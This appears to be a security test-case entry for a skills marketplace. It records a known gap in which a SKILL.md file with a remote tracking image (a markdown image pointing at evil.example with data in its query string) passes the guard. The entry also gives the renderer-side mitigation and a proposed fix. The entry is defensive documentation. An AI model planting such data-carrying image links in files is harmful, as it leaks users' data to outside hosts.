cases.label: malicious
cases.note: a remote tracking image whose URL carries data, in SKILL.md
cases.knownGap: The Skills Guard and the file policy accept a SKILL.md containing a remote tracking image (![x](https://evil.example/pixel.png?...)). Not fixed here: skills_guard.py is vendored and R27 keeps it unmodified in this release. Mitigation lives in the renderer: the Marketplace UI never loads remote images from a stranger's SKILL.md (Task 9, live-verified 0 requests to the evil host). Proposed fix: flag markdown/HTML image URLs with a query string or non-allowlisted host in skill.ts.
